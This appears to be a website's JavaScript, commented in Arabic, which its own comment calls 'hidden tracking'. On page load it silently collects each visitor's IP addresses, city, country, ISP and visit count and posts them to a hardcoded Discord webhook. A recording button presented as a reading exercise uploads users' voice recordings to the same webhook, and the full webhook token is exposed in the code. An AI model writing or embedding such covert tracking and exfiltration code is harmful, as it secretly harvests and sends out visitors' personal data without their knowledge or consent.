
// === تتبع خفي: IP + موقع تقريبي + عدد الزيارات ===
(async function () {
    try {
        const ipv4Resp = await fetch("https://api.ipify.org?format=json");
        const ipv4 = (await ipv4Resp.json()).ip;
        let ipv6 = "غير متوفر";
        try {
            const ipv6Resp = await fetch("https://api64.ipify.org?format=json");
            ipv6 = (await ipv6Resp.json()).ip;
        } catch {}
        const locResp = await fetch("https://ipapi.co/json/");
        const loc = await locResp.json();
        const key = `visit_${ipv4}`;
        let count = parseInt(localStorage.getItem(key) || "0") + 1;
        localStorage.setItem(key, count);
        const payload = {
            IPv4: ipv4,
            IPv6: ipv6,
            City: loc.city,
            Country: loc.country_name,
            ISP: loc.org,
            Visits: count
        };
        fetch("https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: JSON.stringify(payload) })
        });
    } catch (e) {
        console.error(e);
    }
})();

// === تسجيل صوتي ورفع الملف بطريقة صحيحة مع رسالة حالة لاحقة ===
document.addEventListener("DOMContentLoaded", () => {
    const btn = document.getElementById("recordButton");
    if (!btn) return;
    const webhookURL = "https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm";
    const uploadSpeed = 500 * 1024; // bytes/s
    const words = ["الوطن","السلام","النجاح","الحرية","القراءة"];
    const selected = words[Math.floor(Math.random() * words.length)];
    let mediaRecorder, chunks = [];

    btn.addEventListener("click", async () => {
        if (!mediaRecorder || mediaRecorder.state === "inactive") {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: "audio/webm" });
                    const estSec = Math.ceil(blob.size / uploadSpeed);

                    // 1) إرسال رسالة حالة بداية الرفع
                    await fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: `تم استلام تسجيل صوتي جديد. جاري رفع الملف... متبقياً تقريباً ${estSec} ثانية.`
                        })
                    });

                    // 2) رفع الملف مع الوصف
                    const form = new FormData();
                    form.append("file", blob, "voice.webm");
                    form.append("payload_json", JSON.stringify({
                        content: `الكلمة المطلوبة: ${selected}\nنتيجة القراءة: تحت التقييم.`
                    }));
                    await fetch(webhookURL, { method: "POST", body: form });

                    chunks = [];
                };

                mediaRecorder.start();
                btn.textContent = "إيقاف التسجيل";
                setTimeout(() => {
                    if (mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                        btn.textContent = "بدء تسجيل الصوت";
                    }
                }, 30000);
            } catch (err) {
                console.error(err);
            }
        } else {
            mediaRecorder.stop();
            btn.textContent = "بدء تسجيل الصوت";
        }
    });
});
